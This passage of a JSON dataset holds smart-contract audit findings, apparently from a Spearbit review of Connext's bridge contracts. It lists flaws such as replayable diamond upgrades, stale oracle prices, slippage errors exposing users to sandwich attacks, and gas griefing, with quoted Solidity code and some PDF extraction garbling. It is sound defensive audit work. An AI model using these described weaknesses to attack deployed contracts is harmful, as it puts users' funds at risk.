        "body": "The function diamondCut() of LibDiamond verifies the signed version of the update parameters. It checks the signed version is available and a sufficient amount of time has passed. However it doesnt prevent multiple executions and the signed version stays valid forever. This allows old updates to be executed again. Assume the following:  facet_x (or function_y) has value: version_1.  then: replace facet_x (or function_y) with version_2.  then a bug is found in version_2 and it is rolled back with: replace facet_x (or function_y) with ver- sion_1. 23  then a (malicious) owner could immediately do: replace facet_x (or function_y) with version_2 (be- cause it is still valid). Note: the risk is limited because it can only executed by the contract owner, however this is probably not how the mechanism should work. library LibDiamond { function diamondCut(...) ... { ... uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Not always safeApprove(..., 0)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Some functions like _reconcileProcessPortal of BaseConnextFacet and _swapAssetOut of As- setLogic do safeApprove(..., 0) first. contract NomadFacet is BaseConnextFacet { function _reconcileProcessPortal( ... ) ... { ... // Edge case with some tokens: Example USDT in ETH Mainnet, after the backUnbacked call there ,! could be a remaining allowance if not the whole amount is pulled by aave. // Later, if we try to increase the allowance it will fail. USDT demands if allowance is not 0, ,! it has to be set to 0 first. // Example: ,! ,! [ParaSwapRepayAdapter.sol#L138-L140](https://github.com/aave/aave-v3-periphery/blob/ca184e5278bcbc1 0d28c3dbbc604041d7cfac50b/contracts/adapters/paraswap/ParaSwapRepayAdapter.sol#L138-L140) c SafeERC20.safeApprove(IERC20(adopted), s.aavePool, 0); SafeERC20.safeIncreaseAllowance(IERC20(adopted), s.aavePool, totalRepayAmount); ... } } While the following functions dont do this:  xcall of BridgeFacet.  _backLoan of PortalFacet.  _swapAsset of AssetLogic.  execute of Executor. This could result in problems with tokens like USDT. 24 contract BridgeFacet is BaseConnextFacet { ,! function xcall(XCallArgs calldata _args) external payable nonReentrant whenNotPaused returns (bytes32) { ... SafeERC20.safeIncreaseAllowance(IERC20(bridged), address(s.bridgeRouter), bridgedAmt); ... } } contract PortalFacet is BaseConnextFacet { function _backLoan(...) ... { ... SafeERC20Upgradeable.safeIncreaseAllowance(IERC20Upgradeable(_asset), s.aavePool, _backing + ,! _fee); ... } } library AssetLogic { function _swapAsset(...) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); ... } } contract Executor is IExecutor { function execute( ... ) ... { ... SafeERC20.safeIncreaseAllowance(IERC20(_args.assetId), _args.to, _args.amount); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "_slippageTol does not adjust for decimal differences",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Users set the slippage tolerance in percentage. The assetLogic calculates: minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR Then assetLogic uses minReceived in the swap functions. The minReceived, however, does not adjust for the decimal differences between assetIn and assetOut. Users will either always hit the slippage or suffer huge slippage when assetIn and assetOut have a different number of decimals. Assume the number of decimals of assetIn is 6 and the decimal of assetOut is 18. The minReceived will be set to 10-12 smaller than the correct value. Users would be vulnerable to sandwich attacks in this case. Assume the number of decimals of assetIn is 18 and the number of decimals of assetOut is 6. The minReceived will be set to 1012 larger than the correct value. Users would always hit the slippage and the cross-chain transfer will get stuck. 25 library AssetLogic { function _swapAsset(... ) ... { // Swap the asset to the proper local asset uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR; ... return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Canonical assets should be keyed on the hash of domain and id",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "A canonical asset is a tuple of a (domain, id) pair. TokenRegistrys owner has the power to regis- ter new tokens in the system (See TokenRegistry.ensureLocalToken() and TokenRegistry.enrollCustom()). A canonical asset is registered using the hash of its domain and id (See TokenRegistry._setCanonicalToRepre- sentation()). Connext uses only the id of a canonical asset to uniquely identify. Here are a few references:  swapStorages  canonicalToAdopted It is an issue if TokenRegistry registers two canonical assets with the same id. canonical asset an unintended one might be transferred to the destination chain, of the transfers may revert. If this id fetches the incorrect",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing checks for Chainlink oracle",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "ConnextPriceOracle.getTokenPrice() function goes through a series of oracles. At each step, it has a few validations to avoid incorrect price. If such validations succeed, the function returns the non-zero oracle price. For the Chainlink oracle, getTokenPrice() ultimately calls getPriceFromChainlink() which has the following validation  if (answer == 0 || answeredInRound < roundId || updateAt == 0) { // answeredInRound > roundId ===> ChainLink Error: Stale price // updatedAt = 0 ===> ChainLink Error: Round not complete return 0; } updateAt refers to the timestamp of the round. This value isnt checked to make sure it is recent. 26 Additionally, it is important to be aware of the minAnswer and maxAnswer of the Chainlink oracle, these values are not allowed to be reached or surpassed. See Chainlink API reference for documentation on minAnswer and maxAnswer as well as this piece of code: OffchainAggregator.sol",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Same params.SlippageTol is used in two different swaps",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Connext protocol does a cross-chain transfer with the help of the Nomad protocol. to use the Nomad protocol, Connext has to convert the adopted token into the local token. For a cross-chain transfer, users take up two swaps. Adopted -> Local at the source chain and Local -> Adopted at the destination chain. BridgeFacet.sol#L299-L304 function xcall(XCallArgs calldata _args) external payable whenNotPaused nonReentrant returns (bytes32) { ... // Swap to the local asset from adopted if applicable. (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( canonical, transactingAssetId, amount, _args.params.slippageTol ); ... } BridgeFacet.sol#L637 function _handleExecuteLiquidity( bytes32 _transferId, bytes32 _canonicalId, bool _isFast, ExecuteArgs calldata _args ) private returns (uint256, address) { ... // swap out of mad* asset into adopted asset if needed return AssetLogic.swapFromLocalAssetIfNeeded(_canonicalId, _args.local, toSwap, _args.params.slippageTol); ,! } The same slippage tolerance _args.params.slippageTol is used in two swaps. In most cases users cannot set the correct slippage tolerance to protect two swaps. Assume the Nomad asset is slightly cheaper in both chains. 1 Nomad asset equals 1.01 adopted asset. An expected swap would be:1 adopted -> 1.01 Nomad asset -> 1 adopted. The right slippage tolerance should be set at 1.01 and 0.98 respectively. Users cannot set the correct tolerance with a single parameter. This makes users vulnerable to MEV searchers. Also, user transfers get stuck during periods of instability.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "getTokenPrice() returns stale token prices",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "getTokenPrice() reads from the assetPrices[tokenAddress].price mapping which stores the latest price as configured by the protocol admin in setDirectPrice(). However, the check for a stale token price will never fallback to other price oracles as tokenPrice != 0. Therefore, the stale token price will be unintentionally returned.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Potential division by zero if gas token oracle is faulty",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "In the event that the gas token oracle is faulty and returns malformed values, the call to reim- burseRelayerFees() in _handleExecuteTransaction() will fail. Fortunately, the low-level call() function will not prevent the transfer from being executed, however, this may lead to further issues down the line if changes are made to the sponsor vault.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Burn does not lower allowance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _takeTokens() of BridgeRouter takes in the tokens from the sender. Sometimes it transfers them and sometimes it burns them. In the case of burning the tokens, the allowance isnt \"used up\". 28 function _takeTokens(... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount); ... } else { ... _t.burn(msg.sender, _amount); ... } ... // doesn't use up the allowance } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function burn(address _from, uint256 _amnt) external override onlyOwner { _burn(_from, _amnt); } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Two step ownership transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function setAdmin() transfer ownership to a new address. In case a wrong address is supplied ownership is inaccessible. The same issue occurs with transferOwnership of OwnableUpgradeable in several Nomad contracts. Additionally the Nomad contract try to prevent renounceOwnership, however, this can also be accomplished with transferOwnership to a non existing address. Relevant Nomad contracts:  TokenRegistry.sol  NomadBase.sol  UpdaterManager.sol  XAppConnectionManager.sol 29 contract ConnextPriceOracle is PriceOracle { ... function setAdmin(address newAdmin) external onlyAdmin { address oldAdmin = admin; admin = newAdmin; emit NewAdmin(oldAdmin, newAdmin); } } contract BridgeRouter is Version0, Router { ... /** * @dev should be impossible to renounce ownership; * * */ we override OpenZeppelin OwnableUpgradeable's implementation of renounceOwnership to make it a no-op function renounceOwnership() public override onlyOwner { // do nothing } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function removeRouter does not clear approvedForPortalRouters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function removeRouter() clears most of the fields of the struct RouterPermissionsManagerInfo except for approvedForPortalRouters. However, it is still good to also remove approvedForPortalRouters in removeRouter() because if the router were to be added again later (via setupRouter() ) or _isRouterOwnershipRenounced is set in the future, the router would still have the old approvedForPortalRouters. 30 struct RouterPermissionsManagerInfo { mapping(address => bool) approvedRouters; // deleted mapping(address => bool) approvedForPortalRouters; // not deleted mapping(address => address) routerRecipients; // deleted mapping(address => address) routerOwners; // deleted mapping(address => address) proposedRouterOwners; // deleted mapping(address => uint256) proposedRouterTimestamp; // deleted } contract RoutersFacet is BaseConnextFacet { function removeRouter(address router) external onlyOwner { ... s.routerPermissionInfo.approvedRouters[router] = false; ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... delete s.routerPermissionInfo.proposedRouterOwners[router]; delete s.routerPermissionInfo.proposedRouterTimestamp[router]; } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Anyone can self burn lp token of the AMM",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When providing liquidity into the AMM pool, users get LP tokens. Users can redeem their shares of the liquidity by redeeming LP to the AMM pool. The current LPToken contract inherits Openzepplins ERC20BurnableUpgradeable. Users can burn their tokens by calling burn without notifying the AMM pools. ERC20BurnableUpgradeable.sol#L26-L28. Although users do not profit from this action, it brings up concerns such as:  An exploiter has an easy way to pump the LP price. Burning LP is similar to donating value to the pool. While its good for the pool, this gives the exploiter another tool to break other protocols. After the cream finance attack many protocols started to take extra caution and made this a restricted function (absorbing donation) github.com/yearn/yearn-security/blob/master/disclosures/2021-10-27.md.  Against the best practice. Every state of an AMM is related to price. Allowing external actors to change the AMM states without notifying the main contract is dangerous. Its also harder for a developer to build other novel AMM based on the same architecture. Note: the burn function is also not protected by nonReentrant or whenNotPaused.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Skip timeout in diamondCut() (edge case)",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Edge case: If someone manages to get an update through which deletes all facets then the next update skips the delay (because ds.facetAddresses.length will be 0). library LibDiamond { function diamondCut(...) ... { ... if (ds.facetAddresses.length != 0) { uint256 time = ds.acceptanceTimes[keccak256(abi.encode(_diamondCut, _init, _calldata))]; require(time != 0 && time < block.timestamp, \"LibDiamond: delay not elapsed\"); } // Otherwise, this is the first instance of deployment and it can be set automatically ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit gas for s.executor.execute()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The call to s.executor.execute() in BridgeFacet might use up all available gas. In that case, the call to callback to report to the originator might not be called because the execution stops due an out of gas error. Note: the execute() function might be retried by the relayer so perhaps this will fix itself eventually. Note: excessivelySafeCall in Executor does limit the amount of gas. contract BridgeFacet is BaseConnextFacet { function _handleExecuteTransaction(...) ... { ... (bool success, bytes memory returnData) = s.executor.execute(...); // might use all available ,! gas ... // If callback address is not zero, send on the PromiseRouter if (_args.params.callback != address(0)) { s.promiseRouter.send(...); // might not have enough gas } ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Several external functions missing whenNotPaused mofifier",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The following functions dont have a whenNotPaused modifier while most other external functions do.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet. Without whenNotPaused these functions can still be executed when the protocol is paused.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Gas griefing attack on callback execution",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When the callback is executed on the source chain the following line can revert or consume all forwarded gas. In this case, the relayer wastes gas and doesnt get the callback fee. ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData());",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Callback fails when returnData is empty",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If a transfer involves a callback, PromiseRouter reverts if returnData is empty. if (_returnData.length == 0) revert PromiseRouter__send_returndataEmpty(); However, the callback should be allowed in case the user wants to report the calldata execution success on the destination chain (_returnSuccess).",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redundant fee on transfer logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function repayAavePortalFor() has logic for fee on transfer tokens. However, handleIncomin- gAsset() doesnt allow fee on transfer tokens. So this extra code shouldnt be necessary in repayAavePortal- For(). function repayAavePortalFor(...) ... { ... (, uint256 amount) = AssetLogic.handleIncomingAsset(_adopted, total, 0); ... // If this was a fee on transfer token, reduce the total if (amount < total) { uint256 missing; unchecked { missing = total - amount; } if (missing < _feeAmount) { // Debit fee amount unchecked { _feeAmount -= missing; } } else { // Debit backing amount unchecked { missing -= _feeAmount; } _feeAmount = 0; _backingAmount -= missing; } } ... } library AssetLogic { function handleIncomingAsset(...) ... { ... // Transfer asset to contract trueAmount = transferAssetToContract(_assetId, _assetAmount); .... } function transferAssetToContract(address _assetId, uint256 _amount) internal returns (uint256) { ... // Validate correct amounts are transferred uint256 starting = IERC20(_assetId).balanceOf(address(this)); SafeERC20.safeTransferFrom(IERC20(_assetId), msg.sender, address(this), _amount); // Ensure this was not a fee-on-transfer token if (IERC20(_assetId).balanceOf(address(this)) - starting != _amount) { revert AssetLogic__transferAssetToContract_feeOnTransferNotSupported(); } ... } } 34",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Some gas can be saved in reimburseLiquidityFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Some gas can be saved by assigning tokenExchange before the if statement. This also improves readability. function reimburseLiquidityFees(...) ... { ... if (address(tokenExchanges[_token]) != address(0)) { // could use `tokenExchange` ITokenExchange tokenExchange = tokenExchanges[_token]; // do before the if }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "LIQUIDITY_FEE_DENOMINATOR could be a constant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The value of LIQUIDITY_FEE_DENOMINATOR seems to be constant. However, it is currently stored in s and requires an SLOAD operation to retrieve it, increasing gas costs. upgrade-initializers/DiamondInit.sol: BridgeFacet.sol: BridgeFacet.sol: PortalFacet.sol: AssetLogic.sol: s.LIQUIDITY_FEE_DENOMINATOR = 10000; toSwap = _getFastTransferAmount(..., s.LIQUIDITY_FEE_DENOMINATOR); s.portalFeeDebt[_transferId] = ... / s.LIQUIDITY_FEE_DENOMINATOR; if (_aavePortalFeeNumerator > s.LIQUIDITY_FEE_DENOMINATOR) ... uint256 minReceived = (_amount * _slippageTol) / s.LIQUIDITY_FEE_DENOMINATOR;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Access elements from storage array instead of loading them in memory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "SwapUtils.removeLiquidityOneToken() function only needs the length and one element of the storage array self.pooledTokens. For this, the function reads the entire array in memory which costs extra gas. IERC20[] memory pooledTokens = self.pooledTokens; ... uint256 numTokens = pooledTokens.length; ... pooledTokens[tokenIndex].safeTransfer(msg.sender, dy); 35",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Send information through calldata instead of having callee query Executor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Executor.originSender(), Executor.origin(), and Executor.amount() to permission crosschain calls. This costs extra gas because of staticcalls made to an external contract.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "AAVE portal debt might not be repaid in full if debt is converted to interest paying",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Aave portal mechanism gives routers access to a limited amount of unbacked debt which is to be used when fronting liquidity for cross-chain transfers. The process for receiving unbacked debt is as follows:  During message execution, the protocol checks if a single liquidity provider has bid on a liquidity auction which is handled by the relayer network.  If the provider has insufficient liquidity, the protocol attempts to utilize AAVE unbacked debt by minting uncol- lateralised aTokens and withdrawing them from the pool. The withdrawn amount is immediately used to pay out the recipient of the bridge transfer.  Currently the debt is fixed fee, see arc-whitelist-connext-for-v3-portals, however this might be changed in the future out of band.  Incase this would be changed: upon repayment, AAVE will actually expect unbackedDebt + fee + aToken interest. The current implementation will only track unbackedDebt + fee, hence, the protocol will accrue bad debt in the form of interest. Eventually, the extent of this bad debt will reach a point where the unbacked- MintCap has been reached and noone is able to pay off this debt. I consider this to be a long-term issue that could be handled in a future upgrade, however, it is important to highlight and address these issues early.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Routers pay the slippage cost for users when using AAVE credit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "When routers do the fast of adopted token and _fastTransferAmount = * _fastTransferAmount /s.LIQUIDITY_FEE_DENOMINATOR _args.amount * s.LIQUIDITY_FEE_NUMERATOR / s.LIQUIDITY_FEE_DENOMINATOR. The routers get reimbursed _args.amount of local tokens afterward. Thus, the routers lose money if the slippage of swapping between local tokens and adopted tokens are larger than the liquidityFee. function _executePortalTransfer( bytes32 _transferId, bytes32 _canonicalId, uint256 _fastTransferAmount, address _router ) internal returns (uint256, address) { // Calculate local to adopted swap output if needed address adopted = s.canonicalToAdopted[_canonicalId]; ,! ,! ,! IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); // Improvement: Instead of withdrawing to address(this), withdraw directly to the user or executor to save 1 transfer uint256 amountWithdrawn = IAavePool(s.aavePool).withdraw(adopted, _fastTransferAmount, address(this)); if (amountWithdrawn < _fastTransferAmount) revert BridgeFacet__executePortalTransfer_insufficientAmountWithdrawn(); // Store principle debt s.portalDebt[_transferId] = _fastTransferAmount; // Store fee debt s.portalFeeDebt[_transferId] = (s.aavePortalFeeNumerator * _fastTransferAmount) / s.LIQUIDITY_FEE_DENOMINATOR; ,! emit AavePortalMintUnbacked(_transferId, _router, adopted, _fastTransferAmount); return (_fastTransferAmount, adopted); }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Optimize max checks in initializeSwap()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function initializeSwap() reverts if a value is >= ...MAX.... Probably should revert when > ...MAX.... function initializeSwap(...) ... { ... // Check _a, _fee, _adminFee, _withdrawFee parameters if (_a >= AmplificationUtils.MAX_A) revert SwapAdminFacet__initializeSwap_aExceedMax(); if (_fee >= SwapUtils.MAX_SWAP_FEE) revert SwapAdminFacet__initializeSwap_feeExceedMax(); if (_adminFee >= SwapUtils.MAX_ADMIN_FEE) revert SwapAdminFacet__initializeSwap_adminFeeExceedMax(); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "All routers share the same AAVE debt",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The mintUnbacked amount is allocated to the calling contract (eg the Connext Diamond that has the BRIDGE role permission). Thus it is not separated to different routers, if one router does not payback its debt (in time) and has the max debt then this facility cannot be used any more. function _executePortalTransfer( ... ) ... { ... IAavePool(s.aavePool).mintUnbacked(adopted, _fastTransferAmount, address(this), AAVE_REFERRAL_CODE); ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful with fee on transfer tokens on AAVE loans",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The Aave function backUnbacked() does not account for fee on transfer tokens. If these happen to be used then the accounting might not be right. function _backLoan(...) ... { ... // back loan IAavePool(s.aavePool).backUnbacked(_asset, _backing, _fee); ... } library BridgeLogic { function executeBackUnbacked(... ) ... { ... reserve.unbacked -= backingAmount.toUint128(); reserve.updateInterestRates(reserveCache, asset, added, 0); IERC20(asset).safeTransferFrom(msg.sender, reserveCache.aTokenAddress, added); ... } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Let getTokenPrice() also return the source of the price info",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function getTokenPrice() can get its prices information from multiple sources. For the caller it might be important to know which source was used. function getTokenPrice(address _tokenAddress) public view override returns (uint256) { }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Typos in the comments of _swapAsset() and _swapAssetOut()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "There are typos in the comments of _swapAsset() and _swapAssetOut(): * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAsset(... ) ... * @notice Swaps assetIn t assetOut using the stored stable swap or internal swap pool function _swapAssetOut(...) ...",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consistently delete array entries in PromiseRouter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "In function process() of PromiseRouter.sol two different ways are used to clear a value: one with delete and the other with = 0. Although technically the same it better to use the same method to maintain consistency. function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // remove message delete messageHashes[transferId]; // remove callback fees callbackFees[transferId] = 0; ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "getTokenPrice() will revert if setDirectPrice() is set in the future",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The setDirectPrice() function allows the protocol admin to update the price up to two seconds in the future. This impacts the getTokenPrice() function as the updated value may be slightly incorrect.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Roundup in words not optimal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function words, which is used in the Nomad code base, tries to do a round up. Currently it adds 1 to the len. /** * @notice * @param memView * @return */ The number of memory words this memory view occupies, rounded up. The view uint256 - The number of memory words function words(bytes29 memView) internal pure returns (uint256) { return uint256(len(memView)).add(32) / 32; }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "callback could have capped returnData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function execute() caps the result of the call to excessivelySafeCall to a maximum of MAX_- COPY bytes, making sure the result is small enough to fit in a message sent back to the originator. However, when the callback is done the originator needs to be aware that the data can be capped and this fact is not clearly documented. 41 function execute(...) ... { ... (success, returnData) = ExcessivelySafeCall.excessivelySafeCall( _args.to, gas, isNative ? _args.amount : 0, MAX_COPY, _args.callData ); } function process(bytes32 transferId, bytes calldata _message) public nonReentrant { ... // execute callback ICallback(callbackAddress).callback(transferId, _msg.returnSuccess(), _msg.returnData()); // returnData is capped ... ,! }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Several external functions are not nonReentrant",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The following functions dont have nonReentrant, while most other external functions do have such modifier.  bumpTransfer of BridgeFacet.  forceReceiveLocal of BridgeFacet.  repayAavePortal of PortalFacet.  repayAavePortalFor of PortalFacet.  initiateClaim of RelayerFacet. There are many swaps in the protocol and some of them should be conducted in an aggregator (not yet imple- mented). A lot of the aggregators use the difference between pre-swap balance and post-swap balance. (e.g. uniswap v3 router , 1inch, etc.. ). While this isnt exploitable yet, there is a chance that future updates might open up an issue to exploit.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "NomadFacet.reconcile() has an unused argument canonicalDomain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "NomadFacet.reconcile() has an unused argument canonicalDomain.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "SwapUtils._calculateSwap() returns two values with different precision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "SwapUtils._calculateSwap() returns (uint256 dy, uint256 dyFee). dy is the amount of tokens a user will get from a swap and dyFee is the associated fee. To account for the different token decimal precision between the two tokens being swapped, a multipliers mapping is used to bring the precision to the same value. To return the final values, dy is changed back to the original token precision but dyFee is not. This is an internal function and the callers adjust the fee precision back to normal, therefore severity is informa- tional. But without documentation it is easy to miss.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Multicall.sol not compatible with Natspec",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Multicall.sol Natspec comment specifies: /// @title Multicall - Aggregate results from multiple read-only function calls However, to call those functions it uses a low level call() method which can call write functions as well. (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "reimburseRelayerFees only what is necessary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function reimburseRelayerFees() gives a maximum of relayerFeeCap to a receiver, unless it already has a balance of relayerFeeCap. This implicitly means that a balance relayerFeeCap is sufficient. So if a receiver already has a balance only relayerFeeCap - _to.balance is required. This way more recipients can be reimbursed with the same amount of funds in the SponsorVault. function reimburseRelayerFees(...) ... { ... if (_to.balance > relayerFeeCap || Address.isContract(_to)) { // Already has fees, and the address is a contract return; } ... sponsoredFee = sponsoredFee >= relayerFeeCap ? relayerFeeCap : sponsoredFee; ... }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "safeIncreaseAllowance and safeDecreaseAllowance can be replaced with safeApprove in _recon- cileProcessPortal",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The NomadFacet uses safeIncreaseAllowance after clearing the allowance. creaseAllowance to clear the allowance. Using safeApprove is potentially safer in this case. Some non-standard tokens only allow the allowance to change from zero, or change to zero. Using safeDecreaseAllowance would potentially break the contract in a future update. Note that SafeApprove has been deprecated for the concern of a front-running attack. It is only supported when setting an initial allowance or setting the allowance to zero SafeERC20.sol#L38",
